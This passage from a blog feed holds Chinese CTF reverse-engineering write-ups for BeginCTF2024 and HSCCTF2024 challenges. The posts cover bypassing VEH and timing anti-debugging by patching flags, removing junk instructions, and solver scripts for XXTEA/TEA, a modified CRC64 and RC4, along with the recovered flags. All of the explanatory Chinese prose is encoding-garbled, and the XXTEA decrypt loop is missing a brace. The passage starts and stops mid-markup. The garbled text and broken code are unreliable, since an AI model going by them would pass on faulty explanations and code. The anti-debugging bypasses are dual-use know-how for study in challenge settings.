class="hljs-comment">#æŠŠæ¯ä¸€è¡Œçš„æ•°å­—è¿èµ·æ¥å˜æˆäºŒè¿›åˆ¶ï¼Œå†è½¬æ¢ä¸ºåè¿›åˆ¶</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">sum</span>((j &lt;&lt; <span class="hljs-number">6</span> ^ <span class="hljs-number">4102</span> - i ^ key <span class="hljs-keyword">for</span> key <span class="hljs-keyword">in</span> <span class="hljs-string">b&#x27;beginCTF&#x27;</span>)) == n: <br>            <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(j), end=<span class="hljs-string">&quot;&quot;</span>)<br>            <span class="hljs-keyword">break</span><br><span class="hljs-comment">#begin&#123;Y@u_aRe_g00d_aT_play1ng_witH_sNake3&#125;</span><br></code></pre></td></tr></table></figure><h2 id="not-main-1"><a href="#not-main-1" class="headerlink" title="not_main-1"></a>not_main-1</h2><p>mainå‡½æ•°æœ‰ä¸ªtea</p><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1707979757333-dd70d300-8f41-4934-97c5-921e8ef1f5e4.png" class="" title="img"><p>æœ‰vehåè°ƒè¯•</p><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1707983479051-7c947081-579d-4590-bb07-b86fc9e0967c.png" class="" title="img"><p>æœ¬é¢˜é€šè¿‡å®ç°ä¸€ä¸ªå…¨å±€ç±»è®©ç¨‹åºåœ¨mainå‡½æ•°ä¹‹å‰å°±æ‰§è¡Œç±»çš„æ„é€ å‡½æ•°ï¼Œåœ¨mainå‡½æ•°ç»“æŸåæ‰§è¡Œç±»çš„ææ„å‡½æ•°</p><p>æ„é€ å‡½æ•°ä¸­vehå®šä¹‰äº†int 3æ–­ç‚¹å’Œé™¤0å¼‚å¸¸çš„å¤„ç†æ–¹æ³•</p><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1707983700530-4022be77-f4f3-4fdf-a263-24924734409b.png" class="" title="img"><p>int3æ–­ç‚¹çš„å¤„ç†é€»è¾‘æ˜¯ï¼Œå½“å‰ç¨‹åºåœ¨mainå‡½æ•°ä¸­ä¼šæ‰§è¡Œäº‹å…ˆæ”¾ç½®çš„int3ï¼Œæ­¤æ—¶å¦‚æœåœ¨æœªè°ƒè¯•çš„æƒ…å†µä¸‹ï¼Œç¨‹åºå°†å¼‚å¸¸äº¤ç»™vehå¤„ç†ï¼Œå°†ä¸€ä¸ªdword_405038èµ‹å€¼ä¸º0. å¦‚æœæ˜¯è°ƒè¯•æƒ…å†µä¸‹å°†å¼‚å¸¸äº¤ç»™è°ƒè¯•å™¨å¤„ç†ï¼Œå¦‚æœæ­¤æ—¶è°ƒè¯•å™¨å¤„ç†å¼‚å¸¸åˆ™ä¸ä¼šäº¤ç»™vehï¼Œåˆ™dword_405038ä¸º1.mainå‡½æ•°æ¥ä¸‹æ¥ä¼šå¯¹è¾“å…¥è¿›è¡Œè™šå‡çš„åˆ¤æ–­ã€‚åœ¨åˆ¤æ–­åè¿›å…¥åˆ°ææ„å‡½æ•°ä¸­</p><p>ææ„å‡½æ•°ä¼šæ ¹æ®å…ˆå‰çš„dword_405038å³å›¾ä¸­çš„is_debugå˜é‡çš„å€¼åˆ¤æ–­æ˜¯å¦é™¤é›¶ã€‚é™¤é›¶è¿›å…¥åˆ°veh handlerçš„é™¤é›¶å¼‚å¸¸å¤„ç†å—ä¸­</p><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1707983982520-4d2801b1-229a-422d-8b24-2c64b30ea358.png" class="" title="img"><p>åé¢æ˜¯æ ‡å‡†çš„xxtea</p><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1707984388378-1e345bb4-f09f-4285-83fc-efa6d238560d.png" class="" title="img"><p>åœ¨starté‡Œæ‰¾åˆ°å…³é”®å‡½æ•°</p><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1707984893642-f220056c-1fb1-4d5e-bcf5-f138b4ee0eb9.png" class="" title="img"><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1707985056980-3934cacd-2209-4dda-a2cd-a82c76d9b4f7.png" class="" title="img"><p>ç¬¬ä¸‰ä¸ªå‚æ•°å¯ä»¥çœ‹åˆ°ä¸¤ä¸ªç–‘ä¼¼å¯†æ–‡çš„åœ°å€</p><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1707985106747-98b4b2d8-0f60-4dc3-8e84-33c0f5d41585.png" class="" title="img"><p>unk_485018å¼•ç”¨åˆ†åˆ«åœ¨Handlerå’Œmainï¼Œæœ‰å¯èƒ½æ˜¯mainé‡Œçš„å‡å¯†æ–‡</p><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1707985207681-f34fa9c4-7d5d-4ca3-952b-2dfe7c43ca5b.png" class="" title="img"><p>ç¬¬å››ä¸ªåˆ™ä¼šè§¦å‘Handler</p><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1707985133208-40cbe056-87dd-4f91-8185-84f1377121ba.png" class="" title="img"><p>Handlerå†…çš„unk_485018å¼•ç”¨åˆ™å†æ¬¡è¿›è¡Œäº†è¿™ä¸ªæ“ä½œï¼Œä¹Ÿå°±æ˜¯è¯´ç­‰äºæ²¡å¼‚æˆ–</p><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1707985328408-88d4bf17-7681-47c2-80ba-82336264feda.png" class="" title="img"><p>æ‰€ä»¥å¦‚æœçœŸé€»è¾‘åœ¨Handlerå†…ï¼Œunk_485018å°±æ˜¯æ²¡ç”¨çš„æ•°æ®ï¼ŒçœŸæ­£çš„å¯†æ–‡å°±æ˜¯unk_48503C</p><p>å¯ä»¥ä»¥è¿™ç§æ–¹å¼å–æ•°æ®</p><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1707985438972-3538b599-c7f5-4324-8f09-f2c6300fc9d4.png" class="" title="img"><p>å‘ç°è°ƒç”¨Handleråœ¨mainä¹‹å‰</p><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1707985562001-4455721c-e62b-4e6c-b2cb-5509d2010e13.png" class="" title="img"><p>å¯ä»¥çœ‹åˆ°mainå½“ä¸­çš„æ˜æ–‡æ˜¯ä»Handlerä¸­å¼•ç”¨çš„ï¼Œå¯èƒ½XXTEAä¹‹ååˆè¿›è¡Œäº†TEA</p><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1707985501920-3c7dc036-300b-498f-83f8-705596327bdf.png" class="" title="img"><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _CRT_SECURE_NO_WARNINGS</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> DELTA 0x9e3779b9</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MX (((z&gt;&gt;5^y<span class="hljs-string">&lt;&lt;2)+(y&gt;</span>&gt;3^z&lt;&lt;4))^((sum^y)+(key[(p&amp;3)^e]^z)))</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">btea</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span>* v, <span class="hljs-type">int</span> n, <span class="hljs-type">uint32_t</span> <span class="hljs-type">const</span> key[<span class="hljs-number">4</span>])</span><br>&#123;<br>    <span class="hljs-type">uint32_t</span> y, z, sum;<br>    <span class="hljs-type">unsigned</span> p, rounds, e;<br>    <span class="hljs-keyword">if</span> (n &gt; <span class="hljs-number">1</span>)<br>    &#123;<br>        rounds = <span class="hljs-number">6</span> + <span class="hljs-number">52</span> / n;<span class="hljs-comment">//è¿™é‡Œå¯ä»¥è¯´æ˜¯é¢„å®šä¹‰å€¼ï¼Œn=2æ˜¯rounds=32</span><br>        sum = <span class="hljs-number">0</span>;<br>        z = v[n - <span class="hljs-number">1</span>];<br>        <span class="hljs-keyword">do</span><br>        &#123;<br>            sum += DELTA;<br>            e = (sum &gt;&gt; <span class="hljs-number">2</span>) &amp; <span class="hljs-number">3</span>;<br>            <span class="hljs-keyword">for</span> (p = <span class="hljs-number">0</span>; p &lt; n - <span class="hljs-number">1</span>; p++)      <br>            &#123;<br>                y = v[p + <span class="hljs-number">1</span>];<br>                z = v[p] += MX;<br>            &#125;<br>            y = v[<span class="hljs-number">0</span>];<br>            z = v[n - <span class="hljs-number">1</span>] += MX;       <br>        &#125; <span class="hljs-keyword">while</span> (--rounds);<br>    &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (n &lt; <span class="hljs-number">-1</span>)<br>    &#123;<br>        n = -n;<br>        rounds = <span class="hljs-number">6</span> + <span class="hljs-number">52</span> / n;<br>        sum = rounds * DELTA;<br>        y = v[<span class="hljs-number">0</span>];<br>        <span class="hljs-keyword">do</span><br>        &#123;<br>            e = (sum &gt;&gt; <span class="hljs-number">2</span>) &amp; <span class="hljs-number">3</span>;<br>            <span class="hljs-keyword">for</span> (p = n - <span class="hljs-number">1</span>; p &gt; <span class="hljs-number">0</span>; p--)    <br>                z = v[p - <span class="hljs-number">1</span>];<br>                y = v[p] -= MX;<br>            &#125;<br>            z = v[n - <span class="hljs-number">1</span>];<br>            y = v[<span class="hljs-number">0</span>] -= MX;    <br>            sum -= DELTA;<br>        &#125; <span class="hljs-keyword">while</span> (--rounds);<br>    &#125;<br>&#125;<br><span class="hljs-type">void</span> <span class="hljs-title function_">detea</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span>* v, <span class="hljs-type">uint32_t</span>* k)</span> &#123;<br>    <span class="hljs-type">uint32_t</span> v0 = v[<span class="hljs-number">0</span>], v1 = v[<span class="hljs-number">1</span>], sum = <span class="hljs-number">0xC6EF3720</span>, i;<br>    <span class="hljs-type">uint32_t</span> delta = <span class="hljs-number">0x9e3779b9</span>;<br>    <span class="hljs-type">uint32_t</span> k0 = k[<span class="hljs-number">0</span>], k1 = k[<span class="hljs-number">1</span>], k2 = k[<span class="hljs-number">2</span>], k3 = k[<span class="hljs-number">3</span>];<br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">32</span>; i++) &#123;<br>        v1 -= ((v0 &lt;&lt; <span class="hljs-number">4</span>) + k2) ^ (v0 + sum) ^ ((v0 &gt;&gt; <span class="hljs-number">5</span>) + k3);<br>        v0 -= ((v1 &lt;&lt; <span class="hljs-number">4</span>) + k0) ^ (v1 + sum) ^ ((v1 &gt;&gt; <span class="hljs-number">5</span>) + k1);<br>        sum -= delta;<br>    &#125;<br>    v[<span class="hljs-number">0</span>] = v0; v[<span class="hljs-number">1</span>] = v1;<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">uint32_t</span> v[<span class="hljs-number">8</span>] = &#123; <span class="hljs-number">0xCFBE0F1B</span>, <span class="hljs-number">0x05F3083F</span>, <span class="hljs-number">0x4220E43B</span>, <span class="hljs-number">0x3383AFEE</span>, <span class="hljs-number">0xFA3237CE</span>, <span class="hljs-number">0xECADA66E</span>, <span class="hljs-number">0xA8D47CA7</span>, <span class="hljs-number">0xEFC51077</span> &#125;;<br>    <span class="hljs-type">uint32_t</span> k[<span class="hljs-number">4</span>] = &#123; <span class="hljs-number">116</span>,<span class="hljs-number">114</span>,<span class="hljs-number">117</span>,<span class="hljs-number">101</span> &#125;;<span class="hljs-comment">//true</span><br>    <span class="hljs-type">uint32_t</span> fk[<span class="hljs-number">4</span>] = &#123; <span class="hljs-number">0x66</span>,<span class="hljs-number">0x61</span>,<span class="hljs-number">0x6B</span>,<span class="hljs-number">0x65</span> &#125;;<span class="hljs-comment">//fake</span><br>    <span class="hljs-type">int</span> i, n = <span class="hljs-number">8</span>;<br>    btea(v, -n, k);<span class="hljs-comment">//è´Ÿå·æ˜¯è§£å¯†</span><br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">8</span>; i += <span class="hljs-number">2</span>)<br>        detea(v + i, fk);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s&quot;</span>, v);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-comment">//begin&#123;not_main_is_matter!&#125;</span><br></code></pre></td></tr></table></figure><h2 id="å‡ºé¢˜äººçš„å¯†ç -1"><a href="#å‡ºé¢˜äººçš„å¯†ç -1" class="headerlink" title="å‡ºé¢˜äººçš„å¯†ç -1"></a>å‡ºé¢˜äººçš„å¯†ç -1</h2><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1707121166054-454a20dc-fc79-4173-b3b9-c0ade38d93b4.png" class="" title="img"><p>æœ‰èŠ±æŒ‡ä»¤ï¼ŒæŒ‰å®˜æ–¹wpçš„æ–¹æ³•å»èŠ±æŒ‡ä»¤</p><p>callæŒ‡ä»¤æŒ‰uï¼Œä¸‹ä¸€è¡ŒæŒ‰cï¼Œå†nop callï¼ŒæŠŠ90è½¬ä¸ºæ•°æ®ï¼Œå†æŒ‰cå˜ä¸ºnop</p><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1710310180745-911708e0-4a7c-441c-8994-c2950867a4c2.png" class="" title="img"><p>å¯†æ–‡</p><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1710310207895-f8791692-bf2a-40e0-8245-5eb5676ffff7.png" class="" title="img"><p>æœBufferçš„å¼•ç”¨å°±å¯ä»¥å¿«é€Ÿæ‰¾åˆ°åŠ å¯†å‡½æ•°</p><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1710310683087-94b0f31b-b8bf-48f0-89e6-5bfcdcad3755.png" class="" title="img"><p>ç›´æ¥é€†å‘ï¼Œä½†æ˜¯v2ä¸çŸ¥é“</p><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1710311710013-96128072-d39b-432e-9457-08b664e82f66.png" class="" title="img"><p>ç›´æ¥ä¸‹æ–­ç‚¹ä¼šæœ‰åè°ƒè¯•ï¼Œå›åˆ°ä¸»å‡½æ•°ï¼Œä¸‹æ–­ç‚¹åˆ¤æ–­åè°ƒè¯•åœ¨ä¸€å¼€å§‹çš„åœ°æ–¹</p><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1710311890774-ae42d0ee-d594-4b68-bf4c-ddf0632ad3ff.png" class="" title="img"><p>ä¿®æ”¹zfç»•è¿‡</p><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1710311816831-261ccade-b998-4c91-b323-6032f9d92f27.png" class="" title="img"><p>å‘ç°ä¸‹é¢è¿˜æœ‰ä¸€ä¸ªï¼Œå†æ¬¡æ”¹zf</p><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1710311983982-1708e580-6d8e-4797-a38a-be068c139ce2.png" class="" title="img"><p>ç›´æ¥å¾—åˆ°çš„keyæ˜¯ä¸å¯¹çš„ï¼Œå› ä¸ºè¿˜æœ‰æ—¶é—´åè°ƒè¯•</p><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1710312577210-a68f4a5f-7b37-43a7-908e-ab585aa1f299.png" class="" title="img"><p>nopæ‰ç„¶åapply,è¾“å…¥è´¦å·çš„æ—¶å€™è®°å¾—è¾“å…¥ç¾¤å·612995005</p><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1710315109337-d15b2b90-cd4a-4f5b-a800-02658cda1afd.png" class="" title="img"><p>äº¤å‰å¼•ç”¨è¾“å…¥çš„å­—ç¬¦ä¸²</p><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1710311347958-ca23a5f4-da8c-4f84-ac57-0e883451890f.png" class="" title="img"><p>å…ˆ+5 ^0x25,ç„¶åä¼ ç»™æ¯”è¾ƒçš„å¯†æ–‡</p><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1710311364570-4da8a936-7595-4d84-89e7-884e6507b168.png" class="" title="img"><p>ä¸»è¦åŠ å¯†æ˜¯ä¸€ä¸ªé­”æ”¹çš„crc64ï¼Œé€šè¿‡å’Œé›¶æ¯”è¾ƒï¼Œä»è€Œè¿›è¡Œä¸åŒçš„åŠ å¯†ï¼Œå®é™…ä¸Šæ˜¯æ¯”è¾ƒæœ€é«˜ä½</p><p>å¯ä»¥ç›´æ¥é€†</p><p>é«˜ä½æº¢å‡ºåˆ°äº†æœ€ä½ä½ï¼Œæ‰€ä»¥çœ‹å¯†æ–‡æœ€ä½ä½ï¼Œæ ¹æ®æœ€ä½ä½åˆ¤æ–­è¿™ä¸ªæ•°åœ¨åŠ å¯†å‰æœ€é«˜ä½æ˜¯1è¿˜æ˜¯0</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c">key = <span class="hljs-number">0x33077d</span><br><br>def decrypt(value, key):<br>    <span class="hljs-keyword">for</span> i in range(<span class="hljs-number">64</span>):<br>        <span class="hljs-keyword">if</span> value &amp; <span class="hljs-number">1</span>:<br>            value = (value ^ key) &gt;&gt; <span class="hljs-number">1</span><br>            value |= <span class="hljs-number">0x8000000000000000</span>  #è¿˜åŸæœ€é«˜ä½<br>        <span class="hljs-keyword">else</span>:<br>            value = value &gt;&gt; <span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> value<br><br>out = bytes.fromhex(<span class="hljs-string">&#x27;B4BBD8EBD06EABCA658E4BE94DD44AF37D29C2F99589A4859DCDDF77FD45CB5D7DFD934BBCF67CF32442F5D2DDE356AE&#x27;</span>)<br>out = [((i ^ <span class="hljs-number">0x25</span>) - <span class="hljs-number">5</span>) &amp; <span class="hljs-number">0xff</span> <span class="hljs-keyword">for</span> i in out]<br>print(out)<br><br>flag = b<span class="hljs-number">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i in range(<span class="hljs-number">0</span>, len(out), <span class="hljs-number">8</span>):<br>    v = <span class="hljs-type">int</span>.from_bytes(out[i: i + <span class="hljs-number">8</span>], <span class="hljs-string">&#x27;little&#x27;</span>)<br>    flag += decrypt(v, key).to_bytes(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;little&#x27;</span>)<br><br>print(flag.decode())<br></code></pre></td></tr></table></figure><h2 id="goforfun-2"><a href="#goforfun-2" class="headerlink" title="goforfun-2"></a>goforfun-2</h2><p>å’Œbigåº“æœ‰å…³</p><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1710318523731-8f633811-dfcc-413f-989a-f197ff873f01.png" class="" title="img"><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1710318348426-6ef3ad5c-2474-447a-9de3-46ac29da1373.png" class="" title="img"><p>rc4éƒ¨åˆ†å¾ˆéš¾è¾¨åˆ«ï¼ŒåŒæ—¶keyä¹Ÿæ‰¾ä¸åˆ°</p><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1710318429901-180e1f48-0226-4990-8feb-e4d16d39104c.png" class="" title="img"><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs c">def <span class="hljs-title function_">big_int_to_byte_array</span><span class="hljs-params">(big_int)</span>:<br>    ans=[]<br>    <span class="hljs-keyword">while</span> big_int :<br>        ans.append(big_int&amp;<span class="hljs-number">0xff</span>)<br>        big_int&gt;&gt;=<span class="hljs-number">8</span><br>    <span class="hljs-keyword">return</span> ans[::<span class="hljs-number">-1</span>]<br><br><br>cmpString = <span class="hljs-string">&quot;HZ0sMJXqxHgUb2b9RNg+1xw&quot;</span><br><br>str1 = <span class="hljs-string">&quot;8G+cazk2jqb7w01CtoKH4FsrgR3vVmQ9pPhXLAleOd/nB6DfIxMWYiUZ5SEJyNuT&quot;</span><br><br>cmpString = <span class="hljs-built_in">list</span>(cmpString)<br><br>str1 = <span class="hljs-built_in">list</span>(str1)<br><br>tmp=[]<br><br><span class="hljs-keyword">for</span> i in cmpString:<br>    tmp.append(str1.index(i))<br><br>print(<span class="hljs-string">&#x27;index:&#x27;</span>)<br>print(tmp)<br><br>bignum = <span class="hljs-number">0</span><br><br><span class="hljs-keyword">for</span> i in range(len(tmp)<span class="hljs-number">-1</span>,<span class="hljs-number">-1</span>,<span class="hljs-number">-1</span>):<br>    bignum = bignum*<span class="hljs-number">0x40</span> + tmp[i]<br><br><span class="hljs-meta">#print(<span class="hljs-string">&#x27;bignum:&#x27;</span>)</span><br><span class="hljs-meta">#print((bignum))</span><br><br>bytea = big_int_to_byte_array(bignum)<br><br><span class="hljs-meta">#print(bytea)</span><br><br>def rc4_crypt(key, data):<br>    S = <span class="hljs-built_in">list</span>(range(<span class="hljs-number">255</span>,<span class="hljs-number">-1</span>,<span class="hljs-number">-1</span>))<br>    j = <span class="hljs-number">0</span><br>    out = []<br><br>    # åˆå§‹åŒ–Sç›’<br>    <span class="hljs-keyword">for</span> i in range(<span class="hljs-number">256</span>):<br>        j = (j + S[i] + ord(key[i % len(key)]) ) % <span class="hljs-number">256</span><br>        S[i], S[j] = S[j], S[i]<br><br>    # ç”Ÿæˆå¯†é’¥æµå¹¶åŠ è§£å¯†<br>    i = j = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> <span class="hljs-type">char</span> in data:<br>        i = (i + <span class="hljs-number">1</span>) % <span class="hljs-number">256</span><br>        j = (j + S[i]) % <span class="hljs-number">256</span><br>        S[i], S[j] = S[j], S[i]<br>        out.append(((<span class="hljs-type">char</span>) ^ S[(S[i] + S[j]) % <span class="hljs-number">256</span>]^<span class="hljs-number">0x2f</span>))<br><br>    <span class="hljs-keyword">return</span> out<br><br><br>key1=<span class="hljs-string">&#x27;happynewyear&#x27;</span><br><br>key1 = <span class="hljs-built_in">list</span>(key1)<br><br>flag=rc4_crypt(key1,bytea)<br><span class="hljs-keyword">for</span> i in flag:<br>    print(chr(i),end=<span class="hljs-string">&#x27;&#x27;)</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>æ¯”èµ›wp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>èŠ±æŒ‡ä»¤</tag>
      
      <tag>veh</tag>
      
      <tag>crc64é­”æ”¹</tag>
      
      <tag>å–è¯</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HSCCTF2024</title>
    <link href="/2024/03/10/HSCCTF2024/"/>
    <url>/2024/03/10/HSCCTF2024/</url>
    
    <content type="html"><![CDATA[<h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="hello-hscctf"><a href="#hello-hscctf" class="headerlink" title="hello-hscctf"></a>hello-hscctf</h2><p>ä»å›¾ç‰‡ä¸­æå–å…³é”®ä¿¡æ¯</p><img src="/2024/03/10/HSCCTF2024/1709965570558-80b04d90-c33f-4182-a596-1fc0d1c32809.png" class="" title="img"><p>(03338) 76 Friseur Kosmetik Montagï¼Œç‚¹æœ€åä¸€ä¸ª</p><img src="/2024/03/10/HSCCTF2024/1709965436900-11ae5ee9-924f-4600-ba89-9405fc614a7d.png" class="" title="img"><p>æŠ¥çº¸å·¦ä¸‹è§’ï¼ŒæœFriseursalon Aerts</p><img src="/2024/03/10/HSCCTF2024/1709965629705-cf6b6322-fd1e-4e6f-846b-6f8265b578d6.png" class="" title="img"><img src="/2024/03/10/HSCCTF2024/1709965400607-02188237-d602-462f-83ce-16783c0c243f.png" class="" title="img"><img src="/2024/03/10/HSCCTF2024/1709965382282-d5912365-6756-4b76-a271-5435c9507387.png" class="" title="img"><h1 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h1><h2 id="tea"><a href="#tea" class="headerlink" title="tea"></a>tea</h2><p>ç»å…¸teaï¼Œå¯†æ–‡å‘ˆç°å½¢å¼ä¸åŒ</p><img src="/2024/03/10/HSCCTF2024/1709961606736-8a0ceb3b-ea31-492f-8fad-249437667224.png" class="" title="img"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#include &lt;stdio.h&gt;</span><br><span class="hljs-comment">#include &lt;stdint.h&gt;</span><br><br><span class="hljs-built_in">int</span> main() &#123;<br>uint32_t v[<span class="hljs-number">2</span>] = &#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>&#125;;<br>uint32_t delta = <span class="hljs-number">0x61C88647</span>;<br>uint32_t v0 = v[<span class="hljs-number">0</span>], v1 = v[<span class="hljs-number">1</span>], <span 